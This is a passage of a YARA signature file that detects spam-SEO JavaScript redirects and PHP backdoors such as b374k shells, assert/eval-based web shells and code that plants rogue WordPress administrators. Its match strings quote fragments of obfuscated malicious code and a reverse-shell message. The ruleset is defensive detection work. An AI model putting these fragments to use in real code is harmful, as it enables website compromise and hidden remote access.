        $trigger = "var __encode"
    condition:
        $trigger and PR00854 and PR00719
}

private rule PR01304 : trigger
{
    strings:
        $ps0 = "function ajax(a,b,c){var d=null;try{d=new XMLHttpRequest}catch(e){try{"
    condition:
        $ps0
}

rule js_spamseo_redirect_051 : spamseo
{
    strings:
        $trigger = "/post\",{\"version\":"
    condition:
        $trigger and PR01304 and PR00029 and PR00507
}

private rule PR01305 : trigger
{
    strings:
        $ps0 = "cookie=\"redirect=\"+time+\"; path=/; expires=\"+date.toGMTString(),document.write('<script src=\"'+src+'\"><\\/script>')}"
    condition:
        $ps0
}

rule js_spamseo_redirect_052 : spamseo
{
    strings:
        $trigger = "function getCookie"
    condition:
        $trigger and PR01305
}

private rule PR01306 : trigger
{
    strings:
        $ps0 = ",'appendChild','createElement','documentElement','data-zone','src'];(function("
    condition:
        $ps0
}

rule js_spamseo_redirect_053 : spamseo
{
    strings:
        $trigger = "('0x0')]('script'),'https://iclickcdn.com"
    condition:
        $trigger and PR01306 and PR00639
}

private rule PR01307 : trigger
{
    strings:
        $ps0 = "resubscribeOnInstall=!0,self.lary=\"\";var q=[\"https://\",\"/pfe/current/service-worker.min.js?r="
    condition:
        $ps0
}

rule js_spamseo_redirect_054 : spamseo
{
    strings:
        $trigger = "eva"
    condition:
        $trigger and PR01307
}

private rule PR01308 : trigger
{
    strings:
        $ps0 = "navigator.userAgent.match"
    condition:
        $ps0
}

private rule PR01309 : trigger
{
    strings:
        $ps0 = "window.location = \"http://goo.gl/"
    condition:
        $ps0
}

rule js_spamseo_redirect_055 : spamseo
{
    strings:
        $trigger = "GomPlayer"
    condition:
        $trigger and PR01308 and PR01309
}

rule js_spamseo_redirect_056 : spamseo
{
    strings:
        $trigger = "\\x68\\x72\\x65\\x66\",\"\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E"
    condition:
        $trigger and PR00702 and PR00639
}

// MANUAL FIX NECESSARY
private rule PR01310 : trigger
{
    strings:
        $ps0 = "\".split(' ').map((e)=>{return String.fromCharCode(e)}).join('')"
    condition:
        $ps0
}

rule js_spamseo_redirect_057 : spamseo
{
    strings:
        $trigger = "atob("
        $js_spamseo_redirect_057_r0 = /(var [\w]+[\s]*=[\s]*[^;]+;[\s]*)+[\w]+[\s]*\[[\w]+\]\([^\[]+if[\s]*\([\s]*typeof [\w]+[\s]*\[[\w]+\][\s]*==[^<]+fromCharCode\(.\)\}\)\.join\(..\)[^\}]+\}\},[\s]*[^\)]+\);[\s]*/
    condition:
        $trigger and PR01310 and $js_spamseo_redirect_057_r0
}

rule js_spamseo_redirect_058 : spamseo
{
    strings:
        $trigger = "window.location.href=String.fromCharCode(104,116,116,112,"
    condition:
        $trigger and PR00050
}

private rule PR01311 : trigger
{
    strings:
        $ps0 = "echo \"<html><head><script>window.location.href=String.fromCharCode(104"
    condition:
        $ps0
}

private rule PR01312 : trigger
{
    strings:
        $ps0 = "location.href=String.fromCharCode(104,116,116,112"
    condition:
        $ps0
}

rule js_spamseo_redirect_058_02 : spamseo
{
    strings:
        $trigger = "die();"
    condition:
        $trigger and PR01311 and PR01312
}

private rule PR01313 : trigger
{
    strings:
        $ps0 = "atob('dWd"
    condition:
        $ps0
}

rule js_spamseo_redirect_059 : spamseo
{
    strings:
        $trigger = ";window.top.location.href"
    condition:
        $trigger and PR01313 and PR00974
}

rule js_spamseo_redirect_060 : spamseo
{
    strings:
        $trigger = "window.location.replace(sites[Math.floor(Math.random()*sites.length)]);"
    condition:
        $trigger and PR00050
}

private rule PR01314 : trigger
{
    strings:
        $ps0 = "desktop=!(u.portable);r=Math.random();function chance(v){return Math.random()<v;};var chance2=function(v){var total_chance=0;"
    condition:
        $ps0
}

rule js_spamseo_redirect_061 : spamseo
{
    strings:
        $trigger = "document.getElementsByTagName(\"body\")[0].appendChild("
    condition:
        $trigger and PR01314
}

private rule PR01315 : trigger
{
    strings:
        $ps0 = "?FOx="
    condition:
        $ps0
}

rule js_spamseo_redirect_062 : spamseo
{
    strings:
        $trigger = "location.href="
    condition:
        $trigger and PR00050 and PR01315
}

private rule PR01316 : trigger
{
    strings:
        $ps0 = "\\x72\\x65\\x66\\x65\\x72\\x72\\x65\\x72"
    condition:
        $ps0
}

rule js_spamseo_redirect_063 : spamseo
{
    strings:
        $trigger = "window['\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e']['\\x68\\x72\\x65\\x66']="
    condition:
        $trigger and PR01316
}

// MANUAL FIX NECESSARY
rule js_spamseo_redirect_070 : spamseo
{
    strings:
        $trigger = "RewriteRule ^(.*)$ http://"
        $js_spamseo_redirect_070_r0 = /RewriteCond %\{HTTP_REFERER\} \^\.\*\(([\w_-]+\|){40}[^\)]+ahoo\|[^\)]+\)[^\)]+\)/
    condition:
        $trigger and $js_spamseo_redirect_070_r0
}

private rule PR01317 : trigger
{
    strings:
        $ps0 = "if (screen.width <= 480) {"
    condition:
        $ps0
}

rule js_spamseo_redirect_gen_003_02 : spamseo
{
    strings:
        $trigger = "voluumtrk.com"
    condition:
        $trigger and PR00653 and PR00371 and PR01317
}

rule js_spamseo_redirect_gen_003_03 : spamseo
{
    strings:
        $trigger = ".pw/l.php"
    condition:
        $trigger and PR00653 and PR00371 and PR01317
}

rule js_spamseo_SoakSoak_001 : spamseo
{
    strings:
        $trigger = "eval(decodeURIComponent('%28%"
    condition:
        $trigger
}

rule js_spamseo_SoakSoak_002 : spamseo
{
    strings:
        $trigger = "eval(decodeURIComponent('%0D%"
    condition:
        $trigger
}

rule js_spamseo_SoakSoak_003 : spamseo
{
    strings:
        $trigger = "%77%70%2D%69%6E%63%6C%75%64%65%73%2F%6A%73%2F%73%77%66%6F%62%6A%63%74%2E%73%77%66"
    condition:
        $trigger and PR00029 and PR00318
}

private rule PR01318 : trigger
{
    strings:
        $ps0 = "wp-includes"
    condition:
        $ps0
}

rule js_spamseo_unwanted_ads_001 : spamseo
{
    strings:
        $trigger = "n.partnerId=U.PARTNER_ID_PROPELLER;}"
    condition:
        $trigger and PR00224 and PR01318
}

private rule PR01319 : trigger
{
    strings:
        $ps0 = "<iframe class="
    condition:
        $ps0
}

rule js_spamseo_unwanted_ads_002 : spamseo
{
    strings:
        $trigger = "* Front to the WordPress application."
    condition:
        $trigger and PR00050 and PR01319
}

private rule PR01320 : trigger
{
    strings:
        $ps0 = "$._"
    condition:
        $ps0
}

private rule PR01321 : trigger
{
    strings:
        $ps0 = ",new XMLHttpRequest(),document.createElement('script'),_"
    condition:
        $ps0
}

private rule PR01322 : trigger
{
    strings:
        $ps0 = "L2FwdS5waHA="
    condition:
        $ps0
}

rule js_spamseo_unwanted_ads_003 : spamseo
{
    strings:
        $trigger = "fromCharCode"
    condition:
        $trigger and PR00029 and PR01320 and PR01321 and PR01322
}

private rule PR01323 : trigger
{
    strings:
        $ps0 = "suctrack.com/click.php?key"
    condition:
        $ps0
}

private rule PR01324 : trigger
{
    strings:
        $ps0 = "if (in_string (navigator.userAgent,"
    condition:
        $ps0
}

private rule PR01325 : trigger
{
    strings:
        $ps0 = "document.body.appendChild"
    condition:
        $ps0
}

rule js_spamseo_unwanted_ads_004 : spamseo
{
    strings:
        $trigger = "document.createElement('script')"
    condition:
        $trigger and PR01323 and PR01324 and PR01325
}

private rule PR01326 : trigger
{
    strings:
        $ps0 = "function xtrackPageview(){"
    condition:
        $ps0
}

rule js_spamseo_xtrackPageview_001 : spamseo
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00050 and PR01326
}

private rule PR01327 : trigger
{
    strings:
        $ps0 = "function xViewState()"
    condition:
        $ps0
}

rule js_spamseo_xViewState_001 : spamseo
{
    strings:
        $trigger = "+=String.fromCharCode(parseInt(t)+"
    condition:
        $trigger and PR00050 and PR01327
}

private rule PR01328 : trigger
{
    strings:
        $ps0 = ",46,120,121,122,47"
    condition:
        $ps0
}

rule js_spamseo_xyz_script_001 : spamseo
{
    strings:
        $trigger = ",62,60,47,115,99,114,105,112,116,62);document.write("
    condition:
        $trigger and PR01328
}

private rule PR01329 : trigger
{
    strings:
        $ps0 = "cgiprint(\"Sent reverse shell to $ip:$port\");"
    condition:
        $ps0
}

rule pe_backdoor_shell_001 : backdoor
{
    strings:
        $trigger = "/bin/sh"
    condition:
        $trigger and PR01329
}

rule php_backdoor_0x00shell_001 : backdoor
{
    strings:
        $trigger = "~ 0x00 PHP shell v"
    condition:
        $trigger
}

private rule PR01330 : trigger
{
    strings:
        $ps0 = "($_POST["
    condition:
        $ps0
}

rule php_backdoor_1n73ct10n_001 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(str_rot13(base64_decode('7L12W+PG0jD8bOa65"
    condition:
        $trigger and PR01330
}

private rule PR01331 : trigger
{
    strings:
        $ps0 = "3FT Hna Pour unzipi"
    condition:
        $ps0
}

rule php_backdoor_3FTzip_001 : backdoor
{
    strings:
        $trigger = "if (file_exists("
    condition:
        $trigger and PR01331
}

private rule PR01332 : trigger
{
    strings:
        $ps0 = "@move_uploaded_file"
    condition:
        $ps0
}

rule php_backdoor_404notfoundimg_001 : backdoor
{
    strings:
        $trigger = "404-NOT-FOUND-IMG"
    condition:
        $trigger and PR01332
}

private rule PR01333 : trigger
{
    strings:
        $ps0 = "<?php $code="
    condition:
        $ps0
}

private rule PR01334 : trigger
{
    strings:
        $ps0 = "uJgDGKH8hbymrkIGJSJwZLlFxtifEoSBFgSc5VolJWBordrdVSMpiFjwwB4BNna4gF9zml7g"
    condition:
        $ps0
}

private rule PR01335 : trigger
{
    strings:
        $ps0 = "('',"
    condition:
        $ps0
}

rule php_backdoor_4ngel_001 : backdoor
{
    strings:
        $trigger = "));$"
    condition:
        $trigger and PR01333 and PR01334 and PR01335
}

rule php_backdoor_adduser_001 : backdoor
{
    strings:
        $trigger = ">Edit user XPlo"
    condition:
        $trigger and PR00732
}

private rule PR01336 : trigger
{
    strings:
        $ps0 = "unlink(basename($_SERVER[\"PHP_SELF\"]"
    condition:
        $ps0
}

private rule PR01337 : trigger
{
    strings:
        $ps0 = "->dbprefix.\"users (name, username, email, password) VALUES ('Super Admin', '\".$"
    condition:
        $ps0
}

private rule PR01338 : trigger
{
    strings:
        $ps0 = "->set_role('administrator');"
    condition:
        $ps0
}

rule php_backdoor_adduser_002 : backdoor
{
    strings:
        $trigger = "new WP_User("
    condition:
        $trigger and PR01336 and PR01337 and PR01338
}

private rule PR01339 : trigger
{
    strings:
        $ps0 = "@mkdir(\"/home/$usr/etc/$domain\");"
    condition:
        $ps0
}

private rule PR01340 : trigger
{
    strings:
        $ps0 = "$shadow1 = \"/home/$usr/etc/$domain/shadow\";"
    condition:
        $ps0
}

private rule PR01341 : trigger
{
    strings:
        $ps0 = "error_reporting"
    condition:
        $ps0
}

rule php_backdoor_adduser_003 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR00265 and PR01339 and PR01340 and PR01341
}

private rule PR01342 : trigger
{
    strings:
        $ps0 = "echo $user->id"
    condition:
        $ps0
}

private rule PR01343 : trigger
{
    strings:
        $ps0 = "self::EXTERNAL_DIRECTORY . $this->id,"
    condition:
        $ps0
}

rule php_backdoor_adduser_004 : backdoor
{
    strings:
        $trigger = "new WP_User("
    condition:
        $trigger and PR01342 and PR01343
}

private rule PR01344 : trigger
{
    strings:
        $ps0 = "new WP_User(wp_create_user("
    condition:
        $ps0
}

rule php_backdoor_adduser_005 : backdoor
{
    strings:
        $trigger = "user->set_role('administrator');"
    condition:
        $trigger and PR01344
}

private rule PR01345 : trigger
{
    strings:
        $ps0 = "->data->errors){exit('ok');}else{exit('no');}"
    condition:
        $ps0
}

rule php_backdoor_adduser_006 : backdoor
{
    strings:
        $trigger = "new WP_User("
    condition:
        $trigger and PR01345 and PR01338
}

private rule PR01346 : trigger
{
    strings:
        $ps0 = "new WP_User("
    condition:
        $ps0
}

private rule PR01347 : trigger
{
    strings:
        $ps0 = "registration.php"
    condition:
        $ps0
}

private rule PR01348 : trigger
{
    strings:
        $ps0 = "!username_exists("
    condition:
        $ps0
}

private rule PR01349 : trigger
{
    strings:
        $ps0 = "user->set_role('administrator');"
    condition:
        $ps0
}

rule php_backdoor_adduser_007 : backdoor
{
    strings:
        $trigger = "== 'start')"
    condition:
        $trigger and PR01346 and PR01347 and PR01348 and PR01349
}

rule php_backdoor_aio_shell_001 : backdoor
{
    strings:
        $trigger = "<h2 class=\"banner\">PHP AIO SHELL</h2>"
    condition:
        $trigger and PR00013
}

rule php_backdoor_ajaxphpcommandshell_001 : backdoor
{
    strings:
        $trigger = "runcommand('shellhelp','GET')"
    condition:
        $trigger
}

private rule PR01350 : trigger
{
    strings:
        $ps0 = "eval($"
    condition:
        $ps0
}

private rule PR01351 : trigger
{
    strings:
        $ps0 = "base64_decode($_POST["
    condition:
        $ps0
}

rule php_backdoor_anishell_001 : backdoor
{
    strings:
        $trigger = "$socket = fsockopen(\"udp://$IP\", $port"
    condition:
        $trigger and PR01350 and PR01351
}

rule php_backdoor_arakbali_001 : backdoor
{
    strings:
        $trigger = "<!-- form eksekusi command -->"
    condition:
        $trigger and PR00042
}

private rule PR01352 : trigger
{
    strings:
        $ps0 = "@array_filter($sort, $array);"
    condition:
        $ps0
}

rule php_backdoor_array_003 : backdoor
{
    strings:
        $trigger = "array($_REQUEST['sort']);"
    condition:
        $trigger and PR01352
}

rule php_backdoor_array_003_02 : backdoor
{
    strings:
        $trigger = "if(isset($_REQUEST[\"array\"]))"
    condition:
        $trigger and PR01352
}

rule php_backdoor_array_callback_001 : backdoor
{
    strings:
        $trigger = "array_filter($p, $f)"
    condition:
        $trigger
}

rule php_backdoor_array_callback_002 : backdoor
{
    strings:
        $trigger = "error_reporting(0);@array_map"
    condition:
        $trigger and PR00732
}

private rule PR01353 : trigger
{
    strings:
        $ps0 = "asser"
    condition:
        $ps0
}

rule php_backdoor_array_callback_003 : backdoor
{
    strings:
        $trigger = "filter_var_array(array('test' => $_"
    condition:
        $trigger and PR01353
}

rule php_backdoor_array_callback_004 : backdoor
{
    strings:
        $trigger = ";$arr=array($_POST['w0w']"
    condition:
        $trigger
}

private rule PR01354 : trigger
{
    strings:
        $ps0 = "; echo 'OK'; Exit;}"
    condition:
        $ps0
}

private rule PR01355 : trigger
{
    strings:
        $ps0 = "array_filter"
    condition:
        $ps0
}

rule php_backdoor_array_filter_001_001 : backdoor
{
    strings:
        $trigger = "array($_REQUEST['param2']);"
    condition:
        $trigger and PR01354 and PR01355
}

private rule PR01356 : trigger
{
    strings:
        $ps0 = "'],); array_filter($"
    condition:
        $ps0
}

rule php_backdoor_array_filter_002 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR01021 and PR01356 and PR00397
}

rule php_backdoor_array_filter_003 : backdoor
{
    strings:
        $trigger = "array_filter ($GLOBALS,"
    condition:
        $trigger
}

private rule PR01357 : trigger
{
    strings:
        $ps0 = "if (in_array($symbols, $vars"
    condition:
        $ps0
}

rule php_backdoor_array_filter_003_02 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR01357 and PR00397
}

private rule PR01358 : trigger
{
    strings:
        $ps0 = "array_map ("
    condition:
        $ps0
}

private rule PR01359 : trigger
{
    strings:
        $ps0 = "explode('|',$"
    condition:
        $ps0
}

rule php_backdoor_array_filter_003_03 : backdoor
{
    strings:
        $trigger = "if (!function_exists("
    condition:
        $trigger and PR00391 and PR01358 and PR01359
}

// MANUAL FIX NECESSARY
private rule PR01360 : trigger
{
    strings:
        $ps0 = "});/*"
    condition:
        $ps0
}

rule php_backdoor_array_filter_004 : backdoor
{
    strings:
        $trigger = "$_POST"
        $php_backdoor_array_filter_004_r0 = /\((@?\$\s*(\{['\"])?_(POST|COOKIE)[\w\}\{'\"\s,\$\_\/\*\)\@]{10})/
    condition:
        $trigger and PR01360 and $php_backdoor_array_filter_004_r0
}

private rule PR01361 : trigger
{
    strings:
        $ps0 = "$action!=\"publish\""
    condition:
        $ps0
}

private rule PR01362 : trigger
{
    strings:
        $ps0 = "fwrit"
    condition:
        $ps0
}

rule php_backdoor_article_publish_001 : backdoor
{
    strings:
        $trigger = "if($action==\"\"||$password==\"\"||$filename==\"\"||$body==\"\")"
    condition:
        $trigger and PR01361 and PR01362
}

rule php_backdoor_assert_001 : backdoor
{
    strings:
        $trigger = "$__=hex2ascii($___)"
    condition:
        $trigger and PR01353
}

rule php_backdoor_assert_002 : backdoor
{
    strings:
        $trigger = "<? $x=\"a\".\"ss\".\"er\".\"t\"; $x($_POST[\""
    condition:
        $trigger
}

rule php_backdoor_assert_003 : backdoor
{
    strings:
        $trigger = "@array_map('a'.'s'.'s'.'e'.'r'.'t',array($_POST"
    condition:
        $trigger
}

private rule PR01363 : trigger
{
    strings:
        $ps0 = "\"\",\"axsxxsxexrxxt\")"
    condition:
        $ps0
}

rule php_backdoor_assert_004 : backdoor
{
    strings:
        $trigger = "str_replace"
    condition:
        $trigger and PR01363
}

// MANUAL FIX NECESSARY
rule php_backdoor_assert_005 : backdoor
{
    strings:
        $trigger = "base64_decod"
        $php_backdoor_assert_005_r0 = /\(.?YXNzZX/
    condition:
        $trigger and PR01330 and $php_backdoor_assert_005_r0
}

private rule PR01364 : trigger
{
    strings:
        $ps0 = "echo \"Array sort completed\";"
    condition:
        $ps0
}

rule php_backdoor_assert_007 : backdoor
{
    strings:
        $trigger = "@assert(base64_decode("
    condition:
        $trigger and PR01364
}

rule php_backdoor_assert_008 : backdoor
{
    strings:
        $trigger = "assert ($_COOKIE["
    condition:
        $trigger
}

private rule PR01365 : trigger
{
    strings:
        $ps0 = "@$_COOKIE[ssid]"
    condition:
        $ps0
}

rule php_backdoor_assert_009 : backdoor
{
    strings:
        $trigger = "*/ $b='sert'; $a=$a.$b;"
    condition:
        $trigger and PR01365
}

rule php_backdoor_assert_010 : backdoor
{
    strings:
        $trigger = "array(97,115,115,101,114,116)"
    condition:
        $trigger
}

private rule PR01366 : trigger
{
    strings:
        $ps0 = "kbgr(hgyk64_jkiujk("
    condition:
        $ps0
}

rule php_backdoor_assert_013 : backdoor
{
    strings:
        $trigger = "assert_options("
    condition:
        $trigger and PR01366
}

private rule PR01367 : trigger
{
    strings:
        $ps0 = "(str_rot13('riny(onfr64_qrpbqr("
    condition:
        $ps0
}

private rule PR01368 : trigger
{
    strings:
        $ps0 = "assert_options(ASSERT_QUIET_EVAL, 1);"
    condition:
        $ps0
}

rule php_backdoor_assert_013_02 : backdoor
{
    strings:
        $trigger = "assert_options(ASSERT_WARNING, 0);"
    condition:
        $trigger and PR01367 and PR01368
}

private rule PR01369 : trigger
{
    strings:
        $ps0 = "if(isset($_POST["
    condition:
        $ps0
}

private rule PR01370 : trigger
{
    strings:
        $ps0 = "$array[] = $item;"
    condition:
        $ps0
}

rule php_backdoor_assert_014 : backdoor
{
    strings:
        $trigger = "strre"
    condition:
        $trigger and PR01369 and PR01370
}

private rule PR01371 : trigger
{
    strings:
        $ps0 = "$a='rt'; $b='as'; $b.='se' . $a;@$b("
    condition:
        $ps0
}

private rule PR01372 : trigger
{
    strings:
        $ps0 = "str_rot13"
    condition:
        $ps0
}

rule php_backdoor_assert_015 : backdoor
{
    strings:
        $trigger = "onfr64_qrpbqr"
    condition:
        $trigger and PR01371 and PR01372
}

private rule PR01373 : trigger
{
    strings:
        $ps0 = "@assert (get_option"
    condition:
        $ps0
}

rule php_backdoor_assert_016 : backdoor
{
    strings:
        $trigger = "Assert transient option: */ @assert"
    condition:
        $trigger and PR01373
}

private rule PR01374 : trigger
{
    strings:
        $ps0 = "arr2html($_REQUEST"
    condition:
        $ps0
}

private rule PR01375 : trigger
{
    strings:
        $ps0 = "function arr2html($array, &$arr"
    condition:
        $ps0
}

rule php_backdoor_assert_018 : backdoor
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR00013 and PR01374 and PR01375
}

private rule PR01376 : trigger
{
    strings:
        $ps0 = "else @unlink("
    condition:
        $ps0
}

private rule PR01377 : trigger
{
    strings:
        $ps0 = "='as'.\"s\".\"er\"."
    condition:
        $ps0
}

rule php_backdoor_assert_019 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR01376 and PR01377
}

// MANUAL FIX NECESSARY
rule php_backdoor_assert_020 : backdoor
{
    strings:
        $trigger = "$_POST"
        $php_backdoor_assert_020_r0 = /\$\w+\s*=\s*['\"](s|.x73)(t|.x74)(r|.x72)(_|.x5f)(r|.x72)(e|.x65)(p|.x70)(l|.x6c)(a|.x61)(c|.x63)(e|.x65)['\"]\s*;\s*\$\w+\s*=\s*\$\w+\(/
    condition:
        $trigger and $php_backdoor_assert_020_r0
}

private rule PR01378 : trigger
{
    strings:
        $ps0 = "ZXZhbChnemluZmxhdGUoYmFzZTY0X2RlY29kZS"
    condition:
        $ps0
}

rule php_backdoor_assert_021 : backdoor
{
    strings:
        $trigger = "));"
    condition:
        $trigger and PR01378
}

rule php_backdoor_assert_022 : backdoor
{
    strings:
        $trigger = "substr(\"class\",2)"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_backdoor_assert_024 : backdoor
{
    strings:
        $trigger = "asser"
        $php_backdoor_assert_024_r0 = /@[\s]*assert[\s]*\([^;]+\$_(REQUEST|POST|GET)/
    condition:
        $trigger and $php_backdoor_assert_024_r0
}

private rule PR01379 : trigger
{
    strings:
        $ps0 = "isset($_REQUEST["
    condition:
        $ps0
}

private rule PR01380 : trigger
{
    strings:
        $ps0 = "\",(array)$_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_assert_025 : backdoor
{
    strings:
        $trigger = "]) && array_map("
    condition:
        $trigger and PR01379 and PR01380
}

private rule PR01381 : trigger
{
    strings:
        $ps0 = "assert_options( ASSERT_WARNING, 0 ); assert_options( ASSERT_QUIET_EVAL, 1 ); $"
    condition:
        $ps0
}

rule php_backdoor_assert_026 : backdoor
{
    strings:
        $trigger = "onfr64_qrpbqr"
    condition:
        $trigger and PR01381 and PR01372
}

private rule PR01382 : trigger
{
    strings:
        $ps0 = "$_GET["
    condition:
        $ps0
}

private rule PR01383 : trigger
{
    strings:
        $ps0 = "$input = preg_replace(\"[^A-Za-z0-9\\+\\/\\=]\", \"\", $input)"
    condition:
        $ps0
}

private rule PR01384 : trigger
{
    strings:
        $ps0 = "return urldecode($output)"
    condition:
        $ps0
}

rule php_backdoor_assert_028 : backdoor
{
    strings:
        $trigger = "@$config['init']($config['request']"
    condition:
        $trigger and PR01382 and PR01383 and PR01384 and PR00397
}

private rule PR01385 : trigger
{
    strings:
        $ps0 = "=$_POST;@$"
    condition:
        $ps0
}

rule php_backdoor_assert_029 : backdoor
{
    strings:
        $trigger = "str_replace("
    condition:
        $trigger and PR01385
}

private rule PR01386 : trigger
{
    strings:
        $ps0 = "}=base64_decode("
    condition:
        $ps0
}

private rule PR01387 : trigger
{
    strings:
        $ps0 = "){$"
    condition:
        $ps0
}

private rule PR01388 : trigger
{
    strings:
        $ps0 = ";@${${"
    condition:
        $ps0
}

private rule PR01389 : trigger
{
    strings:
        $ps0 = ";if(isset($_GET["
    condition:
        $ps0
}

rule php_backdoor_assert_030 : backdoor
{
    strings:
        $trigger = "($_POST["
    condition:
        $trigger and PR01386 and PR01387 and PR01388 and PR01389
}

rule php_backdoor_assert_032 : backdoor
{
    strings:
        $trigger = "extract($_REQUEST) && @assert(stripslashes"
    condition:
        $trigger
}

private rule PR01390 : trigger
{
    strings:
        $ps0 = "\"]}=fopen(getcwd().\""
    condition:
        $ps0
}

private rule PR01391 : trigger
{
    strings:
        $ps0 = ":{call_user_func_array(\""
    condition:
        $ps0
}

private rule PR01392 : trigger
{
    strings:
        $ps0 = "error_reporting(0);"
    condition:
        $ps0
}

rule php_backdoor_assert_034 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01390 and PR01391 and PR00355 and PR01392
}

rule php_backdoor_assert_035 : backdoor
{
    strings:
        $trigger = "assert(stripslashes($_REQUEST["
    condition:
        $trigger
}

private rule PR01393 : trigger
{
    strings:
        $ps0 = "\",(array)$_COOKIE[\""
    condition:
        $ps0
}

private rule PR01394 : trigger
{
    strings:
        $ps0 = "&& md5($_"
    condition:
        $ps0
}

rule php_backdoor_assert_036 : backdoor
{
    strings:
        $trigger = "array_map(\"a"
    condition:
        $trigger and PR01393 and PR01394
}

rule php_backdoor_assert_037 : backdoor
{
    strings:
        $trigger = "@call_user_func(assert,$_POST['session']);"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR01395 : trigger
{
    strings:
        $ps0 = "=\"\";"
    condition:
        $ps0
}

rule php_backdoor_assert_038 : backdoor
{
    strings:
        $trigger = ", join('', $"
        $php_backdoor_assert_038_r0 = /\.\$[\w]{2}\[[\d]+\],[\s]*[\d]+\),[\s]*[\d]+,/
    condition:
        $trigger and PR01395 and PR01016 and $php_backdoor_assert_038_r0
}

// MANUAL FIX NECESSARY
private rule PR01396 : trigger
{
    strings:
        $ps0 = "chr"
    condition:
        $ps0
}

rule php_backdoor_assert_039 : backdoor
{
    strings:
        $trigger = ".\"\\x"
        $php_backdoor_assert_039_r0 = /=(\"a\"|\".x61\"|chr\(97\))\.(\"s\"|\".x73\"|chr\(115\))\.(\"s\"|\".x73\"|chr\(115\))\.(\"e\"|\".x65\"|chr\(101\))\.(\"r\"|\".x72\"|chr\(114\))\.(\"t\"|\".x74\"|chr\(116\));/
        $php_backdoor_assert_039_r1 = /=(\"b\"|\".x62\"|chr\(98\))\.(\"a\"|\".x61\"|chr\(97\))\.(\"s\"|\".x73\"|chr\(115\))\.(\"e\"|\".x65\"|chr\(101\))\.(\"6\"|\".x36\"|chr\(54\))\.(\"4\"|\".x34\"|chr\(52\))\.(\"_\"|\".x5f\"|chr\(95\))\.(\"d\"|\".x64\"|chr\(100\))\.(\"e\"|\".x65\"|chr\(101\))\.(\"c\"|\".x63\"|chr\(99\))\.(\"o\"|\".x6f\"|chr\(111\))\.(\"d\"|\".x64\"|chr\(100\))\.(\"e\"|\".x65\"|chr\(101\));/
        $php_backdoor_assert_039_r2 = /@\$\w+\(@\$\w+\(@\$\w+\(\$_POST\[(\"d\"|\".x64\"|chr\(100\))/
    condition:
        $trigger and PR01396 and $php_backdoor_assert_039_r0 and $php_backdoor_assert_039_r1 and $php_backdoor_assert_039_r2
}

// MANUAL FIX NECESSARY
rule php_backdoor_assert_040 : backdoor
{
    strings:
        $trigger = "ror_reporting"
        $php_backdoor_assert_040_r0 = /\$\w+\s*=\s*[asert\s\\"\.]+\$[a-zA-Z]{0,8}\.[asert\s\\"\.]+\$[a-zA-Z]{0,8}\.[asert\s\\"\.]+;/
    condition:
        $trigger and $php_backdoor_assert_040_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_assert_042 : backdoor
{
    strings:
        $trigger = "]}[$"
        $php_backdoor_assert_042_r0 = /\]\.\$\w+\[\d+\]\.\$\w+\[\d+\]/
    condition:
        $trigger and PR01016 and PR01073 and $php_backdoor_assert_042_r0
}

rule php_backdoor_b374kshell_002 : backdoor
{
    strings:
        $trigger = "$xName = \"B374K Shell\";"
    condition:
        $trigger
}

rule php_backdoor_b374kshell_003 : backdoor
{
    strings:
        $trigger = ");@$b374k(\""
    condition:
        $trigger
}

rule php_backdoor_b374kshell_004 : backdoor
{
    strings:
        $trigger = "http://code.google.com/p/b374k-shell"
    condition:
        $trigger
}

rule php_backdoor_b374kshell_005 : backdoor
{
    strings:
        $trigger = "author: b374k"
    condition:
        $trigger
}

private rule PR01397 : trigger
{
    strings:
        $ps0 = "b374k"
    condition:
        $ps0
}

rule php_backdoor_b374kshell_006 : backdoor
{
    strings:
        $trigger = "(md5($_POST['pass']));"
    condition:
        $trigger and PR01397
}

rule php_backdoor_b374kshell_007 : backdoor
{
    strings:
        $trigger = "<title>b374k 2."
    condition:
        $trigger
}

rule php_backdoor_b374kshell_010 : backdoor
{
    strings:
        $trigger = "eval(\"?>\".gzinflate(base64_decode(\""
    condition:
        $trigger
}

rule php_backdoor_b374kshell_011 : backdoor
{
    strings:
        $trigger = "$GLOBALS['title'] = \"b374k\";"
    condition:
        $trigger
}

private rule PR01398 : trigger
{
    strings:
        $ps0 = "eval(base64_decode"
    condition:
        $ps0
}

rule php_backdoor_b374kshell_012 : backdoor
{
    strings:
        $trigger = "YjM3NG"
    condition:
        $trigger and PR01398
}

rule php_backdoor_b374kshell_013 : backdoor
{
    strings:
        $trigger = "$b374k = $func("
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR01399 : trigger
{
    strings:
        $ps0 = "urldecode('%"
    condition:
        $ps0
}

rule php_backdoor_b374kshell_014 : backdoor
{
    strings:
        $trigger = "error_reporting"
        $php_backdoor_b374kshell_014_r0 = /set_time_limit\(0\);[\s]*error_reporting\(0\);\$[0O]+[\s]*=[\s]*urldecode\(.%[^;]+\);[^_]+__FILE__;[^_]+preg_replace\(/
    condition:
        $trigger and PR00265 and PR01399 and $php_backdoor_b374kshell_014_r0
}

rule php_backdoor_b374kshell_015 : backdoor
{
    strings:
        $trigger = "/shells/b374k.txt"
    condition:
        $trigger and PR00435
}

rule php_backdoor_b374kshell_016 : backdoor
{
    strings:
        $trigger = "b374k shell"
    condition:
        $trigger
}

rule php_backdoor_b374kshell_016_02 : backdoor
{
    strings:
        $trigger = "'b374k'"
    condition:
        $trigger
}

rule php_backdoor_b374kshell_016_03 : backdoor
{
    strings:
        $trigger = "{[|b374k|]}"
    condition:
        $trigger
}

rule php_backdoor_b374kshell_016_04 : backdoor
{
    strings:
        $trigger = "$GLOBALS['module']['"
    condition:
        $trigger
}

rule php_backdoor_b374kshell_001 : backdoor
{
    strings:
        $trigger = "$GLOBALS['packer']['title'] = \"b374k shell packer\";"
    condition:
        $trigger
}

